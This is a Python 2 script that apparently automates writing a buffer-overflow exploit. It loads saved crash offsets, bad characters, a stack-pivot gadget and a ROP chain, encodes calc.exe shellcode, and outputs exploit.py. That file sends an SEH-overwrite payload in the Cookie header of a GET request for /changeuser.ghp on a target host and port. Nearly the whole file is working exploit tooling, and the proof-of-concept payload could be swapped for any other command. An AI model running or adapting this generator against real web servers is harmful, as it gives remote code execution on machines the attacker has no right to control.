# -*- coding: utf-8 -*-
import cPickle
from ShellCode import *
from Encoder import *

exploit = "exploit.py"

'''
IMPORT_MODULES = "import argparse\n"
IMPORT_MODULES += "import struct"
'''
IMPORT_MODULES = """import argparse
import struct
import socket
"""
PARSER = """parser = argparse.ArgumentParser(description="This is an exploit.")
parser.add_argument("host", nargs="?", type=str, help="Host to attack.")
parser.add_argument("port", nargs="?", type=int, help="Port to attack.")
parser.set_defaults(host="127.0.0.1")
parser.set_defaults(port=80)

parser.print_help()

args = parser.parse_args()
host, port = args.host, args.port
"""

crash_info = "crash_info.pkl"
find_badchars = "badchars.pkl"
stackpivot = "stackpivot.pkl"
ropchain = "ropchain.pkl"

# Get script offset.
with open(crash_info, "rb") as local_file:
	max_size = cPickle.load(local_file)
	seh_offset = cPickle.load(local_file)

# Get badchars.
with open(find_badchars, "rb") as local_file:
	badchars = cPickle.load(local_file)

# Get stackpivot infomation.
with open(stackpivot, "rb") as local_file:
	gadget = cPickle.load(local_file)
	for addr, instructions in gadget.items():
		moveup_gadget = (addr, instructions)
	moveup_offset = cPickle.load(local_file)
	stack_move = cPickle.load(local_file)
	stack_fix = cPickle.load(local_file)

# Get ROP Chain
with open(ropchain, "rb") as local_file:
	rop_chain = cPickle.load(local_file)

TAB = " " * 4
tab = TAB * 0

ropchainCode = "ropchain = [\n"
tab = TAB * 1
for addr, instructions in rop_chain:
	ropchainCode += tab + hex(addr) + ", # " + instructions + "\n"
ropchainCode += "]\n"
ropchainCode += "ropchain = \"\".join(struct.pack(\"<I\", _) for _ in ropchain)\n"

tab = TAB * 0

coder = ShellCode({"type":"win_cmd", "cmd":"calc.exe"})
shellcode = coder.getShellCode()
encoder = Encoder(shellcode, badchars)
shellcode = encoder.encode()

shellcode = getPythonCode(shellcode)

rop_offset = moveup_offset - stack_move + stack_fix
offset = (
	"max_size = " + str(max_size) + "\n"
	"seh_offset = " + str(seh_offset) + "\n"
	"rop_offset = " + str(rop_offset) + "\n"
)

buffer = (
"buffer = \"\"\n"
"buffer += \"A\" * rop_offset\n"
"buffer += ropchain\n"
"buffer += shellcode\n"
"buffer += \"A\" * (seh_offset-len(buffer))\n"
"buffer += \"nseh\"\n"
"buffer += struct.pack(\"<I\"," + hex(moveup_gadget[0]) + ") # " + moveup_gadget[1] +"\n"
"buffer += \"A\" * (max_size-len(buffer))\n"
)

request = (
"request = (\n"
"\"GET /changeuser.ghp HTTP/1.1\\r\\n\"\n"
"\"User-Agent: Mozilla/4.0\\r\\n\"\n"
"\"Host:\" " + "+ host + " + "\":\"" + " + str(port) + " + "\"\\r\\n\"\n"
"\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\"\n"
"\"Accept-Language: en-us\\r\\n\"\n"
"\"Accept-Encoding: gzip, deflate\\r\\n\"\n"
"\"Referer: http://" + "host" + "/\\r\\n\"\n"
"\"Cookie: SESSIONID=6771; UserID=\"" + " + buffer + " + "\"; PassWD=;\\r\\n\"\n"
"\"Conection: Keep-Alive\\r\\n\\r\\n\"\n"
")\n"
)

attacker = """print "[+] Attack " + host + ":" + str(port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
print "[+] Finish."
"""

with open("exploit.py", "w") as exp:
	exp.write(IMPORT_MODULES)
	exp.write("\n")
	exp.write(PARSER)
	exp.write("\n")
	exp.write(ropchainCode)
	exp.write("\n")
	exp.write(shellcode)
	exp.write("\n")
	exp.write(offset)
	exp.write("\n")
	exp.write(buffer)
	exp.write("\n")
	exp.write(request)
	exp.write("\n")
	exp.write(attacker)